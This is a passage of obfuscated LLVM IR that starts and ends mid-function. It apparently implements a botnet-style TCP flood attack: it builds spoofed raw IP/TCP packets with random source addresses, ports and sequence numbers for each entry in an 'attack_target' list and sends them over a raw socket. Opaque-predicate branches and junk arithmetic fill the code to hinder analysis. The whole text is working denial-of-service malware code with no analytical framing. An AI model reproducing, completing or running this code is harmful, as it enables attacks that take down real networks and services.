  %269 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %270 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %269, i32 0, i32 4
  %271 = load i16, i16* %270, align 4
  %272 = and i16 %268, 1
  %273 = shl i16 %272, 9
  %274 = and i16 %271, -513
  %275 = or i16 %274, %273
  store i16 %275, i16* %270, align 4
  %276 = load i8, i8* %25, align 1
  %277 = sext i8 %276 to i16
  %278 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 4
  %280 = load i16, i16* %279, align 4
  %281 = and i16 %277, 1
  %282 = shl i16 %281, 8
  %283 = and i16 %280, -257
  %284 = or i16 %283, %282
  store i16 %284, i16* %279, align 4
  %285 = call i32 @rand_next()
  %286 = and i32 %285, 65535
  %287 = trunc i32 %286 to i16
  %288 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %289 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %288, i32 0, i32 5
  store i16 %287, i16* %289, align 2
  %290 = load i8, i8* %22, align 1
  %291 = icmp ne i8 %290, 0
  %292 = load i32, i32* @x.27
  %293 = load i32, i32* @y.28
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBBpart2190, label %originalBB1alteredBB

originalBBpart2190:                               ; preds = %originalBB1
  br i1 %291, label %300, label %322

; <label>:300:                                    ; preds = %originalBBpart2190
  %301 = load i32, i32* @x.27
  %302 = load i32, i32* @y.28
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBB192, label %originalBB192alteredBB

originalBB192:                                    ; preds = %originalBB192alteredBB, %300
  %309 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %310 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %309, i32 0, i32 4
  %311 = load i16, i16* %310, align 4
  %312 = and i16 %311, -2049
  %313 = or i16 %312, 2048
  store i16 %313, i16* %310, align 4
  %314 = load i32, i32* @x.27
  %315 = load i32, i32* @y.28
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBBpart2202, label %originalBB192alteredBB

originalBBpart2202:                               ; preds = %originalBB192
  br label %322

; <label>:322:                                    ; preds = %originalBBpart2202, %originalBBpart2190
  %323 = load i32, i32* @x.27
  %324 = load i32, i32* @y.28
  %325 = sub i32 %323, 1
  %326 = mul i32 %323, %325
  %327 = urem i32 %326, 2
  %328 = icmp eq i32 %327, 0
  %329 = icmp slt i32 %324, 10
  %330 = or i1 %328, %329
  br i1 %330, label %originalBB204, label %originalBB204alteredBB

originalBB204:                                    ; preds = %originalBB204alteredBB, %322
  %331 = load i8*, i8** %31, align 8
  %332 = load i32, i32* %26, align 4
  call void @rand_str(i8* %331, i32 %332)
  %333 = load i32, i32* @x.27
  %334 = load i32, i32* @y.28
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBBpart2206, label %originalBB204alteredBB

originalBBpart2206:                               ; preds = %originalBB204
  br label %341

; <label>:341:                                    ; preds = %originalBBpart2206
  %342 = load i32, i32* @x.27
  %343 = load i32, i32* @y.28
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBB208, label %originalBB208alteredBB

originalBB208:                                    ; preds = %originalBB208alteredBB, %341
  %350 = load i32, i32* %9, align 4
  %351 = add nsw i32 %350, 1
  store i32 %351, i32* %9, align 4
  %352 = load i32, i32* @x.27
  %353 = load i32, i32* @y.28
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBBpart2213, label %originalBB208alteredBB

originalBBpart2213:                               ; preds = %originalBB208
  br label %134

; <label>:360:                                    ; preds = %134
  br label %361

; <label>:361:                                    ; preds = %647, %360
  store i32 0, i32* %9, align 4
  br label %362

; <label>:362:                                    ; preds = %644, %361
  %363 = load i32, i32* @x.27
  %364 = load i32, i32* @y.28
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBB215, label %originalBB215alteredBB

originalBB215:                                    ; preds = %originalBB215alteredBB, %362
  %371 = load i32, i32* %9, align 4
  %372 = load i8, i8* %5, align 1
  %373 = zext i8 %372 to i32
  %374 = icmp slt i32 %371, %373
  %375 = load i32, i32* @x.27
  %376 = load i32, i32* @y.28
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBBpart2217, label %originalBB215alteredBB

originalBBpart2217:                               ; preds = %originalBB215
  br i1 %374, label %383, label %647

; <label>:383:                                    ; preds = %originalBBpart2217
  %384 = load i8**, i8*** %11, align 8
  %385 = load i32, i32* %9, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds i8*, i8** %384, i64 %386
  %388 = load i8*, i8** %387, align 8
  store i8* %388, i8** %32, align 8
  %389 = load i8*, i8** %32, align 8
  %390 = bitcast i8* %389 to %struct.iphdr*
  store %struct.iphdr* %390, %struct.iphdr** %33, align 8
  %391 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %392 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %391, i64 1
  %393 = bitcast %struct.iphdr* %392 to %struct.tcphdr*
  store %struct.tcphdr* %393, %struct.tcphdr** %34, align 8
  %394 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %395 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %394, i64 1
  %396 = bitcast %struct.tcphdr* %395 to i8*
  store i8* %396, i8** %35, align 8
  %397 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %398 = load i32, i32* %9, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %397, i64 %399
  %401 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %400, i32 0, i32 2
  %402 = load i8, i8* %401, align 4
  %403 = zext i8 %402 to i32
  %404 = icmp slt i32 %403, 32
  br i1 %404, label %405, label %426

; <label>:405:                                    ; preds = %383
  %406 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %407 = load i32, i32* %9, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %406, i64 %408
  %410 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %409, i32 0, i32 1
  %411 = load i32, i32* %410, align 4
  %412 = call i32 @ntohl(i32 %411) #7
  %413 = call i32 @rand_next()
  %414 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %415 = load i32, i32* %9, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %414, i64 %416
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %417, i32 0, i32 2
  %419 = load i8, i8* %418, align 4
  %420 = zext i8 %419 to i32
  %421 = lshr i32 %413, %420
  %422 = add i32 %412, %421
  %423 = call i32 @htonl(i32 %422) #7
  %424 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %425 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %424, i32 0, i32 9
  store i32 %423, i32* %425, align 4
  br label %426

; <label>:426:                                    ; preds = %405, %383
  %427 = load i32, i32* %28, align 4
  %428 = icmp eq i32 %427, -1
  br i1 %428, label %429, label %433

; <label>:429:                                    ; preds = %426
  %430 = call i32 @rand_next()
  %431 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %432 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %431, i32 0, i32 8
  store i32 %430, i32* %432, align 4
  br label %433

; <label>:433:                                    ; preds = %429, %426
  %434 = load i16, i16* %13, align 2
  %435 = zext i16 %434 to i32
  %436 = icmp eq i32 %435, 65535
  br i1 %436, label %437, label %459

; <label>:437:                                    ; preds = %433
  %438 = load i32, i32* @x.27
  %439 = load i32, i32* @y.28
  %440 = sub i32 %438, 1
  %441 = mul i32 %438, %440
  %442 = urem i32 %441, 2
  %443 = icmp eq i32 %442, 0
  %444 = icmp slt i32 %439, 10
  %445 = or i1 %443, %444
  br i1 %445, label %originalBB219, label %originalBB219alteredBB

originalBB219:                                    ; preds = %originalBB219alteredBB, %437
  %446 = call i32 @rand_next()
  %447 = and i32 %446, 65535
  %448 = trunc i32 %447 to i16
  %449 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %450 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %449, i32 0, i32 3
  store i16 %448, i16* %450, align 4
  %451 = load i32, i32* @x.27
  %452 = load i32, i32* @y.28
  %453 = sub i32 %451, 1
  %454 = mul i32 %451, %453
  %455 = urem i32 %454, 2
  %456 = icmp eq i32 %455, 0
  %457 = icmp slt i32 %452, 10
  %458 = or i1 %456, %457
  br i1 %458, label %originalBBpart2233, label %originalBB219alteredBB

originalBBpart2233:                               ; preds = %originalBB219
  br label %459

; <label>:459:                                    ; preds = %originalBBpart2233, %433
  %460 = load i16, i16* %16, align 2
  %461 = zext i16 %460 to i32
  %462 = icmp eq i32 %461, 65535
  br i1 %462, label %463, label %469

; <label>:463:                                    ; preds = %459
  %464 = call i32 @rand_next()
  %465 = and i32 %464, 65535
  %466 = trunc i32 %465 to i16
  %467 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %468 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %467, i32 0, i32 0
  store i16 %466, i16* %468, align 4
  br label %469

; <label>:469:                                    ; preds = %463, %459
  %470 = load i16, i16* %17, align 2
  %471 = zext i16 %470 to i32
  %472 = icmp eq i32 %471, 65535
  br i1 %472, label %473, label %495

; <label>:473:                                    ; preds = %469
  %474 = load i32, i32* @x.27
  %475 = load i32, i32* @y.28
  %476 = sub i32 %474, 1
  %477 = mul i32 %474, %476
  %478 = urem i32 %477, 2
  %479 = icmp eq i32 %478, 0
  %480 = icmp slt i32 %475, 10
  %481 = or i1 %479, %480
  br i1 %481, label %originalBB235, label %originalBB235alteredBB

originalBB235:                                    ; preds = %originalBB235alteredBB, %473
  %482 = call i32 @rand_next()
  %483 = and i32 %482, 65535
  %484 = trunc i32 %483 to i16
  %485 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %486 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %485, i32 0, i32 1
  store i16 %484, i16* %486, align 2
  %487 = load i32, i32* @x.27
  %488 = load i32, i32* @y.28
  %489 = sub i32 %487, 1
  %490 = mul i32 %487, %489
  %491 = urem i32 %490, 2
  %492 = icmp eq i32 %491, 0
  %493 = icmp slt i32 %488, 10
  %494 = or i1 %492, %493
  br i1 %494, label %originalBBpart2240, label %originalBB235alteredBB

originalBBpart2240:                               ; preds = %originalBB235
  br label %495

; <label>:495:                                    ; preds = %originalBBpart2240, %469
  %496 = load i32, i32* @x.27
  %497 = load i32, i32* @y.28
  %498 = sub i32 %496, 1
  %499 = mul i32 %496, %498
  %500 = urem i32 %499, 2
  %501 = icmp eq i32 %500, 0
  %502 = icmp slt i32 %497, 10
  %503 = or i1 %501, %502
  br i1 %503, label %originalBB242, label %originalBB242alteredBB

originalBB242:                                    ; preds = %originalBB242alteredBB, %495
  %504 = load i32, i32* %18, align 4
  %505 = icmp eq i32 %504, 65535
  %506 = load i32, i32* @x.27
  %507 = load i32, i32* @y.28
  %508 = sub i32 %506, 1
  %509 = mul i32 %506, %508
  %510 = urem i32 %509, 2
  %511 = icmp eq i32 %510, 0
  %512 = icmp slt i32 %507, 10
  %513 = or i1 %511, %512
  br i1 %513, label %originalBBpart2244, label %originalBB242alteredBB

originalBBpart2244:                               ; preds = %originalBB242
  br i1 %505, label %514, label %534

; <label>:514:                                    ; preds = %originalBBpart2244
  %515 = load i32, i32* @x.27
  %516 = load i32, i32* @y.28
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBB246, label %originalBB246alteredBB

originalBB246:                                    ; preds = %originalBB246alteredBB, %514
  %523 = call i32 @rand_next()
  %524 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %525 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %524, i32 0, i32 2
  store i32 %523, i32* %525, align 4
  %526 = load i32, i32* @x.27
  %527 = load i32, i32* @y.28
  %528 = sub i32 %526, 1
  %529 = mul i32 %526, %528
  %530 = urem i32 %529, 2
  %531 = icmp eq i32 %530, 0
  %532 = icmp slt i32 %527, 10
  %533 = or i1 %531, %532
  br i1 %533, label %originalBBpart2248, label %originalBB246alteredBB

originalBBpart2248:                               ; preds = %originalBB246
  br label %534

; <label>:534:                                    ; preds = %originalBBpart2248, %originalBBpart2244
  %535 = load i32, i32* %19, align 4
  %536 = icmp eq i32 %535, 65535
  br i1 %536, label %537, label %541

; <label>:537:                                    ; preds = %534
  %538 = call i32 @rand_next()
  %539 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %540 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %539, i32 0, i32 3
  store i32 %538, i32* %540, align 4
  br label %541

; <label>:541:                                    ; preds = %537, %534
  %542 = load i32, i32* @x.27
  %543 = load i32, i32* @y.28
  %544 = sub i32 %542, 1
  %545 = mul i32 %542, %544
  %546 = urem i32 %545, 2
  %547 = icmp eq i32 %546, 0
  %548 = icmp slt i32 %543, 10
  %549 = or i1 %547, %548
  br i1 %549, label %originalBB250, label %originalBB250alteredBB

originalBB250:                                    ; preds = %originalBB250alteredBB, %541
  %550 = load i8, i8* %27, align 1
  %551 = icmp ne i8 %550, 0
  %552 = load i32, i32* @x.27
  %553 = load i32, i32* @y.28
  %554 = sub i32 %552, 1
  %555 = mul i32 %552, %554
  %556 = urem i32 %555, 2
  %557 = icmp eq i32 %556, 0
  %558 = icmp slt i32 %553, 10
  %559 = or i1 %557, %558
  br i1 %559, label %originalBBpart2252, label %originalBB250alteredBB

originalBBpart2252:                               ; preds = %originalBB250
  br i1 %551, label %560, label %579

; <label>:560:                                    ; preds = %originalBBpart2252
  %561 = load i32, i32* @x.27
  %562 = load i32, i32* @y.28
  %563 = sub i32 %561, 1
  %564 = mul i32 %561, %563
  %565 = urem i32 %564, 2
  %566 = icmp eq i32 %565, 0
  %567 = icmp slt i32 %562, 10
  %568 = or i1 %566, %567
  br i1 %568, label %originalBB254, label %originalBB254alteredBB

originalBB254:                                    ; preds = %originalBB254alteredBB, %560
  %569 = load i8*, i8** %35, align 8
  %570 = load i32, i32* %26, align 4
  call void @rand_str(i8* %569, i32 %570)
  %571 = load i32, i32* @x.27
  %572 = load i32, i32* @y.28
  %573 = sub i32 %571, 1
  %574 = mul i32 %571, %573
  %575 = urem i32 %574, 2
  %576 = icmp eq i32 %575, 0
  %577 = icmp slt i32 %572, 10
  %578 = or i1 %576, %577
  br i1 %578, label %originalBBpart2256, label %originalBB254alteredBB

originalBBpart2256:                               ; preds = %originalBB254
  br label %579

; <label>:579:                                    ; preds = %originalBBpart2256, %originalBBpart2252
  %580 = load i32, i32* @x.27
  %581 = load i32, i32* @y.28
  %582 = sub i32 %580, 1
  %583 = mul i32 %580, %582
  %584 = urem i32 %583, 2
  %585 = icmp eq i32 %584, 0
  %586 = icmp slt i32 %581, 10
  %587 = or i1 %585, %586
  br i1 %587, label %originalBB258, label %originalBB258alteredBB

originalBB258:                                    ; preds = %originalBB258alteredBB, %579
  %588 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %589 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %588, i32 0, i32 7
  store i16 0, i16* %589, align 2
  %590 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %591 = bitcast %struct.iphdr* %590 to i16*
  %592 = call zeroext i16 @checksum_generic(i16* %591, i32 20)
  %593 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %594 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %593, i32 0, i32 7
  store i16 %592, i16* %594, align 2
  %595 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %596 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %595, i32 0, i32 6
  store i16 0, i16* %596, align 4
  %597 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %598 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %599 = bitcast %struct.tcphdr* %598 to i8*
  %600 = load i32, i32* %26, align 4
  %601 = sext i32 %600 to i64
  %602 = add i64 20, %601
  %603 = trunc i64 %602 to i16
  %604 = call zeroext i16 @htons(i16 zeroext %603) #7
  %605 = load i32, i32* %26, align 4
  %606 = sext i32 %605 to i64
  %607 = add i64 20, %606
  %608 = trunc i64 %607 to i32
  %609 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %597, i8* %599, i16 zeroext %604, i32 %608)
  %610 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %611 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %610, i32 0, i32 6
  store i16 %609, i16* %611, align 4
  %612 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %613 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %612, i32 0, i32 1
  %614 = load i16, i16* %613, align 2
  %615 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %616 = load i32, i32* %9, align 4
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %615, i64 %617
  %619 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %618, i32 0, i32 0
  %620 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %619, i32 0, i32 1
  store i16 %614, i16* %620, align 2
  %621 = load i32, i32* %10, align 4
  %622 = load i8*, i8** %32, align 8
  %623 = load i32, i32* %26, align 4
  %624 = sext i32 %623 to i64
  %625 = add i64 40, %624
  %626 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %627 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %628 = load i32, i32* %9, align 4
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %627, i64 %629
  %631 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %630, i32 0, i32 0
  %632 = bitcast %struct.sockaddr_in* %631 to %struct.sockaddr*
  store %struct.sockaddr* %632, %struct.sockaddr** %626, align 8
  %633 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %634 = load %struct.sockaddr*, %struct.sockaddr** %633, align 8
  %635 = call i64 @sendto(i32 %621, i8* %622, i64 %625, i32 16384, %struct.sockaddr* %634, i32 16)
  %636 = load i32, i32* @x.27
  %637 = load i32, i32* @y.28
  %638 = sub i32 %636, 1
  %639 = mul i32 %636, %638
  %640 = urem i32 %639, 2
  %641 = icmp eq i32 %640, 0
  %642 = icmp slt i32 %637, 10
  %643 = or i1 %641, %642
  br i1 %643, label %originalBBpart2283, label %originalBB258alteredBB

originalBBpart2283:                               ; preds = %originalBB258
  br label %644

; <label>:644:                                    ; preds = %originalBBpart2283
  %645 = load i32, i32* %9, align 4
  %646 = add nsw i32 %645, 1
  store i32 %646, i32* %9, align 4
  br label %362

; <label>:647:                                    ; preds = %originalBBpart2217
  br label %361

; <label>:648:                                    ; preds = %130, %108
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %109
  store i32 1, i32* %9, align 4
  %649 = load i32, i32* %10, align 4
  %650 = bitcast i32* %9 to i8*
  %651 = call i32 @setsockopt(i32 %649, i32 0, i32 3, i8* %650, i32 4) #6
  %652 = icmp eq i32 %651, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %190
  %653 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %654 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %653, i32 0, i32 6
  store i8 6, i8* %654, align 1
  %655 = load i32, i32* %28, align 4
  %656 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %657 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %656, i32 0, i32 8
  store i32 %655, i32* %657, align 4
  %658 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %659 = load i32, i32* %9, align 4
  %660 = sext i32 %659 to i64
  %661 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %658, i64 %660
  %662 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %661, i32 0, i32 1
  %663 = load i32, i32* %662, align 4
  %664 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %665 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %664, i32 0, i32 9
  store i32 %663, i32* %665, align 4
  %666 = load i16, i16* %16, align 2
  %667 = call zeroext i16 @htons(i16 zeroext %666) #7
  %668 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %669 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %668, i32 0, i32 0
  store i16 %667, i16* %669, align 4
  %670 = load i16, i16* %17, align 2
  %671 = call zeroext i16 @htons(i16 zeroext %670) #7
  %672 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %673 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %672, i32 0, i32 1
  store i16 %671, i16* %673, align 2
  %674 = load i32, i32* %18, align 4
  %675 = trunc i32 %674 to i16
  %676 = call zeroext i16 @htons(i16 zeroext %675) #7
  %677 = zext i16 %676 to i32
  %678 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %679 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %678, i32 0, i32 2
  store i32 %677, i32* %679, align 4
  %680 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %681 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %680, i32 0, i32 4
  %682 = load i16, i16* %681, align 4
  %_ = sub i16 0, %682
  %gen = add i16 %_, -241
  %_2 = sub i16 %682, -241
  %gen3 = mul i16 %_2, -241
  %_4 = sub i16 %682, -241
  %gen5 = mul i16 %_4, -241
  %_6 = shl i16 %682, -241
  %_7 = shl i16 %682, -241
  %683 = and i16 %682, -241
  %_8 = shl i16 %683, 80
  %_9 = sub i16 %683, 80
  %gen10 = mul i16 %_9, 80
  %_11 = shl i16 %683, 80
  %_12 = sub i16 0, %683
  %gen13 = add i16 %_12, 80
  %_14 = sub i16 %683, 80
  %gen15 = mul i16 %_14, 80
  %_16 = sub i16 0, %683
  %gen17 = add i16 %_16, 80
  %684 = or i16 %683, 80
  store i16 %684, i16* %681, align 4
  %685 = load i8, i8* %20, align 1
  %686 = sext i8 %685 to i16
  %687 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %688 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %687, i32 0, i32 4
  %689 = load i16, i16* %688, align 4
  %_18 = sub i16 %686, 1
  %gen19 = mul i16 %_18, 1
  %_20 = shl i16 %686, 1
  %_21 = sub i16 %686, 1
  %gen22 = mul i16 %_21, 1
  %_23 = sub i16 0, %686
  %gen24 = add i16 %_23, 1
  %690 = and i16 %686, 1
  %_25 = sub i16 %690, 13
  %gen26 = mul i16 %_25, 13
  %_27 = sub i16 0, %690
  %gen28 = add i16 %_27, 13
  %_29 = sub i16 0, %690
  %gen30 = add i16 %_29, 13
  %_31 = sub i16 %690, 13
  %gen32 = mul i16 %_31, 13
  %_33 = sub i16 %690, 13
  %gen34 = mul i16 %_33, 13
  %691 = shl i16 %690, 13
  %_35 = sub i16 0, %689
  %gen36 = add i16 %_35, -8193
  %_37 = shl i16 %689, -8193
  %_38 = sub i16 %689, -8193
  %gen39 = mul i16 %_38, -8193
  %_40 = sub i16 0, %689
  %gen41 = add i16 %_40, -8193
  %692 = and i16 %689, -8193
  %_42 = sub i16 %692, %691
  %gen43 = mul i16 %_42, %691
  %_44 = sub i16 0, %692
  %gen45 = add i16 %_44, %691
  %693 = or i16 %692, %691
  store i16 %693, i16* %688, align 4
  %694 = load i8, i8* %21, align 1
  %695 = sext i8 %694 to i16
  %696 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %697 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %696, i32 0, i32 4
  %698 = load i16, i16* %697, align 4
  %_46 = sub i16 0, %695
  %gen47 = add i16 %_46, 1
  %_48 = sub i16 %695, 1
  %gen49 = mul i16 %_48, 1
  %_50 = shl i16 %695, 1
  %_51 = shl i16 %695, 1
  %699 = and i16 %695, 1
  %_52 = sub i16 %699, 12
  %gen53 = mul i16 %_52, 12
  %_54 = shl i16 %699, 12
  %_55 = sub i16 0, %699
  %gen56 = add i16 %_55, 12
  %700 = shl i16 %699, 12
  %_57 = shl i16 %698, -4097
  %701 = and i16 %698, -4097
  %_58 = sub i16 %701, %700
  %gen59 = mul i16 %_58, %700
  %_60 = shl i16 %701, %700
  %_61 = sub i16 %701, %700
  %gen62 = mul i16 %_61, %700
  %_63 = shl i16 %701, %700
  %_64 = shl i16 %701, %700
  %_65 = sub i16 %701, %700
  %gen66 = mul i16 %_65, %700
  %_67 = shl i16 %701, %700
  %_68 = sub i16 %701, %700
  %gen69 = mul i16 %_68, %700
  %_70 = sub i16 0, %701
  %gen71 = add i16 %_70, %700
  %702 = or i16 %701, %700
  store i16 %702, i16* %697, align 4
  %703 = load i8, i8* %22, align 1
  %704 = sext i8 %703 to i16
  %705 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %706 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %705, i32 0, i32 4
  %707 = load i16, i16* %706, align 4
  %_72 = shl i16 %704, 1
  %_73 = sub i16 %704, 1
  %gen74 = mul i16 %_73, 1
  %_75 = sub i16 %704, 1
  %gen76 = mul i16 %_75, 1
  %708 = and i16 %704, 1
  %_77 = shl i16 %708, 11
  %_78 = sub i16 0, %708
  %gen79 = add i16 %_78, 11
  %709 = shl i16 %708, 11
  %_80 = sub i16 %707, -2049
  %gen81 = mul i16 %_80, -2049
  %_82 = sub i16 %707, -2049
  %gen83 = mul i16 %_82, -2049
  %710 = and i16 %707, -2049
  %_84 = sub i16 %710, %709
  %gen85 = mul i16 %_84, %709
  %_86 = sub i16 0, %710
  %gen87 = add i16 %_86, %709
  %_88 = sub i16 %710, %709
  %gen89 = mul i16 %_88, %709
  %_90 = sub i16 %710, %709
  %gen91 = mul i16 %_90, %709
  %_92 = sub i16 0, %710
  %gen93 = add i16 %_92, %709
  %711 = or i16 %710, %709
  store i16 %711, i16* %706, align 4
  %712 = load i8, i8* %23, align 1
  %713 = sext i8 %712 to i16
  %714 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %715 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %714, i32 0, i32 4
  %716 = load i16, i16* %715, align 4
  %_94 = sub i16 0, %713
  %gen95 = add i16 %_94, 1
  %_96 = sub i16 %713, 1
  %gen97 = mul i16 %_96, 1
  %_98 = sub i16 %713, 1
  %gen99 = mul i16 %_98, 1
  %_100 = sub i16 %713, 1
  %gen101 = mul i16 %_100, 1
  %717 = and i16 %713, 1
  %_102 = shl i16 %717, 10
  %_103 = sub i16 %717, 10
  %gen104 = mul i16 %_103, 10
  %_105 = shl i16 %717, 10
  %_106 = shl i16 %717, 10
  %_107 = sub i16 0, %717
  %gen108 = add i16 %_107, 10
  %718 = shl i16 %717, 10
  %_109 = sub i16 0, %716
  %gen110 = add i16 %_109, -1025
  %719 = and i16 %716, -1025
  %_111 = sub i16 %719, %718
  %gen112 = mul i16 %_111, %718
  %_113 = sub i16 %719, %718
  %gen114 = mul i16 %_113, %718
  %_115 = sub i16 %719, %718
  %gen116 = mul i16 %_115, %718
  %_117 = shl i16 %719, %718
  %_118 = sub i16 0, %719
  %gen119 = add i16 %_118, %718
  %720 = or i16 %719, %718
  store i16 %720, i16* %715, align 4
  %721 = load i8, i8* %24, align 1
  %722 = sext i8 %721 to i16
  %723 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %724 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %723, i32 0, i32 4
  %725 = load i16, i16* %724, align 4
  %_120 = sub i16 0, %722
  %gen121 = add i16 %_120, 1
  %_122 = shl i16 %722, 1
  %_123 = shl i16 %722, 1
  %_124 = sub i16 %722, 1
  %gen125 = mul i16 %_124, 1
  %726 = and i16 %722, 1
  %_126 = sub i16 %726, 9
  %gen127 = mul i16 %_126, 9
  %727 = shl i16 %726, 9
  %_128 = sub i16 0, %725
  %gen129 = add i16 %_128, -513
  %_130 = sub i16 0, %725
  %gen131 = add i16 %_130, -513
  %_132 = sub i16 0, %725
  %gen133 = add i16 %_132, -513
  %_134 = sub i16 0, %725
  %gen135 = add i16 %_134, -513
